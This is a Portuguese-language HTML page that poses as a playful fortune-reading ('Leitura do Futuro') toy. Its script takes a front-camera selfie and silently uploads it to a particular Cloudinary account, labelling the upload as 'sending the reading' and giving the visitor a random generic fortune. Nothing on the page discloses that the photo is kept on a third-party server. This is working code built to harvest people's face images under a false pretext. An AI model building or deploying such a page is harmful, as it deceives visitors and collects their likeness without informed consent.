<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>🔮 Leitura do Futuro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: #e5e7eb;
      margin: 0;
      padding: 1rem;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .box {
      background: #020617;
      padding: 1.5rem;
      border-radius: 14px;
      max-width: 360px;
      width: 100%;
      text-align: center;
    }

    button {
      width: 100%;
      padding: 1rem;
      border: none;
      border-radius: 10px;
      background: #6366f1;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
    }

    video, img {
      display: none;
      width: 100%;
      border-radius: 10px;
      margin-top: 1rem;
    }

    video {
      transform: scaleX(-1);
    }

    #frase {
      margin-top: 1.2rem;
      font-style: italic;
      color: #a5b4fc;
    }

    small {
      opacity: 0.7;
      display: block;
      margin-bottom: 1rem;
    }
  </style>
</head>
<body>

<div class="box">
  <h2>🔮 Leitura do Futuro</h2>
  <small>Clique para revelar sua mensagem</small>

  <button id="tirarFoto">Tirar foto</button>

  <video id="video" autoplay playsinline hidden></video>
  <canvas id="canvas" hidden></canvas>
  <img id="preview" hidden>

  <p id="status"></p>
  <p id="frase"></p>
</div>

<script>
/* =========================
   CONFIG CLOUDINARY
========================= */
const CLOUD_NAME = "dagqr3bms";
const UPLOAD_PRESET = "Photos";

/* =========================
   ELEMENTOS
========================= */
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const preview = document.getElementById("preview");
const statusText = document.getElementById("status");
const fraseText = document.getElementById("frase");

let stream;

/* =========================
   FRASES
========================= */
const frases = [
  "Um novo ciclo começa quando você menos espera.",
  "Algo bom já está em movimento.",
  "Sua intuição está correta.",
  "Uma decisão simples muda tudo.",
  "Você está mais perto do que imagina.",
  "Uma oportunidade discreta se aproxima.",
  "Confie mais no processo.",
  "Uma conversa vai clarear tudo.",
  "Você será surpreendido positivamente.",
  "O tempo está ao seu favor.",
  "Você está exatamente onde precisava estar."
];

/* =========================
   UPLOAD CLOUDINARY
========================= */
async function uploadToCloudinary(base64Image) {
  const formData = new FormData();
  formData.append("file", base64Image);
  formData.append("upload_preset", UPLOAD_PRESET);

  const response = await fetch(
    `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
    {
      method: "POST",
      body: formData
    }
  );

  return response.json();
}

/* =========================
   AÇÃO PRINCIPAL
========================= */
document.getElementById("tirarFoto").onclick = async () => {
  try {
    statusText.textContent = "Ativando câmera...";

    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    video.hidden = false;

    await new Promise(r => setTimeout(r, 400));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    const imagemBase64 = canvas.toDataURL("image/jpeg", 0.9);

    preview.src = imagemBase64;
    preview.hidden = false;

    stream.getTracks().forEach(t => t.stop());
    video.hidden = true;

    statusText.textContent = "☁️ Enviando leitura...";

    const resultado = await uploadToCloudinary(imagemBase64);

    console.log("URL Cloudinary:", resultado.secure_url);

    statusText.textContent = "✨ Futuro revelado";

    const sorteio = Math.floor(Math.random() * frases.length);
    fraseText.textContent = frases[sorteio];

    // aqui você já tem:
    // resultado.secure_url (imagem)
    // fraseText.textContent (mensagem)

  } catch (e) {
    console.error(e);
    alert("Erro ao acessar a câmera ou enviar a imagem");
  }
};
</script>

</body>
</html>
